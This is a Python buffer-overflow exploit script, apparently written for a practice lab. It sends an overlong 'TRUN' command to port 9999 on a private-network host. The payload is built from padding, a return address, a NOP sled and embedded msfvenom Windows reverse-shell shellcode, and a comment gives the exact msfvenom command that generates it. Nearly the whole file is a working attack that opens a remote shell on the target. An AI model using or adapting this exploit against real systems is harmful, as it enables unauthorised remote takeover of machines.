#!/usr/bin/python

import socket


victim_host = "10.0.2.4"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b "\x00" -v shellcode -f c -f python

shellcode =  "" # shellcode without \x00 as a bad character
shellcode =  b""
shellcode += b"\xbb\x3e\x9f\x3b\xbe\xdd\xc6\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x5a\x12\x83\xc2\x04"
shellcode += b"\x03\x64\x91\xd9\x4b\x64\x45\x9f\xb4\x94\x96"
shellcode += b"\xc0\x3d\x71\xa7\xc0\x5a\xf2\x98\xf0\x29\x56"
shellcode += b"\x15\x7a\x7f\x42\xae\x0e\xa8\x65\x07\xa4\x8e"
shellcode += b"\x48\x98\x95\xf3\xcb\x1a\xe4\x27\x2b\x22\x27"
shellcode += b"\x3a\x2a\x63\x5a\xb7\x7e\x3c\x10\x6a\x6e\x49"
shellcode += b"\x6c\xb7\x05\x01\x60\xbf\xfa\xd2\x83\xee\xad"
shellcode += b"\x69\xda\x30\x4c\xbd\x56\x79\x56\xa2\x53\x33"
shellcode += b"\xed\x10\x2f\xc2\x27\x69\xd0\x69\x06\x45\x23"
shellcode += b"\x73\x4f\x62\xdc\x06\xb9\x90\x61\x11\x7e\xea"
shellcode += b"\xbd\x94\x64\x4c\x35\x0e\x40\x6c\x9a\xc9\x03"
shellcode += b"\x62\x57\x9d\x4b\x67\x66\x72\xe0\x93\xe3\x75"
shellcode += b"\x26\x12\xb7\x51\xe2\x7e\x63\xfb\xb3\xda\xc2"
shellcode += b"\x04\xa3\x84\xbb\xa0\xa8\x29\xaf\xd8\xf3\x25"
shellcode += b"\x1c\xd1\x0b\xb6\x0a\x62\x78\x84\x95\xd8\x16"
shellcode += b"\xa4\x5e\xc7\xe1\xcb\x74\xbf\x7d\x32\x77\xc0"
shellcode += b"\x54\xf1\x23\x90\xce\xd0\x4b\x7b\x0e\xdc\x99"
shellcode += b"\x2c\x5e\x72\x72\x8d\x0e\x32\x22\x65\x44\xbd"
shellcode += b"\x1d\x95\x67\x17\x36\x3c\x92\xf0\x33\xc1\x9e"
shellcode += b"\x0f\x2c\xc3\x9e\x1e\xf0\x4a\x78\x4a\x18\x1b"
shellcode += b"\xd3\xe3\x81\x06\xaf\x92\x4e\x9d\xca\x95\xc5"
shellcode += b"\x12\x2b\x5b\x2e\x5e\x3f\x0c\xde\x15\x1d\x9b"
shellcode += b"\xe1\x83\x09\x47\x73\x48\xc9\x0e\x68\xc7\x9e"
shellcode += b"\x47\x5e\x1e\x4a\x7a\xf9\x88\x68\x87\x9f\xf3"
shellcode += b"\x28\x5c\x5c\xfd\xb1\x11\xd8\xd9\xa1\xef\xe1"
shellcode += b"\x65\x95\xbf\xb7\x33\x43\x06\x6e\xf2\x3d\xd0"
shellcode += b"\xdd\x5c\xa9\xa5\x2d\x5f\xaf\xa9\x7b\x29\x4f"
shellcode += b"\x1b\xd2\x6c\x70\x94\xb2\x78\x09\xc8\x22\x86"
shellcode += b"\xc0\x48\x52\xcd\x48\xf8\xfb\x88\x19\xb8\x61"
shellcode += b"\x2b\xf4\xff\x9f\xa8\xfc\x7f\x64\xb0\x75\x85"
shellcode += b"\x20\x76\x66\xf7\x39\x13\x88\xa4\x3a\x36"

payload  = "A" * 2003 # fill up the buffer after calculating the offset
payload += "\xAF\x11\x50\x62"    
payload += "\x90" * 16
payload += shellcode

buffer_exploit = "TRUN /.:/" + payload

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((victim_host, port))
expl.send(buffer_exploit)
print("[x] Sent TRUN + malicious payload to the victim")
print("[!] You may need to send it multiple times")
expl.close()
